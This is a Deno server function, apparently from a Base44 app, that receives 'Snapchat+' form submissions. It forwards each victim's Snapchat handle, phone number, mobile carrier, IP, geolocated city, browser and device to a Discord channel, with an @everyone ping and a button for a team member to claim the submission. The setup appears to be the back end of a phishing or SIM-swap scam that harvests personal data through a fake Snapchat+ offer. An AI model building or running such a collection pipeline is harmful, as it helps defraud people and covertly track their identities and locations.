import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const body = await req.json();
    const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;

    const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();

    const finalIp = ip || "Inconnue";
    const finalBrowser = browser || "Inconnu";
    const finalDevice = device || "Inconnu";

    // Geolocate IP
    let finalCountry = country || "Inconnue";
    let finalCity = city || "Inconnue";
    try {
      const geoRes = await base44.functions.invoke("geolocateIP", { ip: finalIp });
      if (geoRes?.data) {
        finalCountry = geoRes.data.country || finalCountry;
        finalCity = geoRes.data.city || finalCity;
      }
    } catch (e) {
      console.error("geolocateIP failed:", e.message);
    }

    const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
    const now = new Date();
    const dateStr = now.toLocaleDateString("fr-FR", {
      weekday: "long", day: "numeric", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const channelId = Deno.env.get("DISCORD_CHANNEL_ID");
    if (!channelId) throw new Error("DISCORD_CHANNEL_ID non configuré");

    const embed = {
      title: "📱 Nouvelle soumission Snapchat+",
      color: operatorColors[operateur] || 16776960,
      fields: [
        { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
        { name: "📡 Opérateur", value: operateur, inline: true },
        { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
        { name: "🌍 Pays", value: finalCountry, inline: true },
        { name: "🏙️ Ville", value: finalCity, inline: true },
        { name: "🌐 Navigateur", value: finalBrowser, inline: true },
        { name: "💾 Appareil", value: finalDevice, inline: true },
        { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
        { name: "🕐 Date de soumission", value: dateStr, inline: false },
      ],
      footer: { text: `ID: ${submissionId || "N/A"}` },
      timestamp: now.toISOString(),
    };

    // Send via bot with interactive button
    const msg = await botAPI(`/channels/${channelId}/messages`, "POST", {
      content: "@everyone",
      embeds: [embed],
      components: [{
        type: 1,
        components: [{
          type: 2,
          style: 1,
          label: "🎯 Prendre en charge",
          custom_id: `claim_${submissionId}`
        }]
      }]
    });

    await base44.asServiceRole.entities.ActionLog.create({
      submission_id: submissionId,
      action: "submitted",
      details: { browser: finalBrowser, device: finalDevice, ip: finalIp, country: finalCountry, city: finalCity },
      timestamp: now.toISOString()
    });

    return Response.json({ ok: true, messageId: msg.id });
  } catch (error) {
    console.error("notifyDiscord error:", error.message);
    return Response.json({ error: error.message }, { status: 500 });
  }
});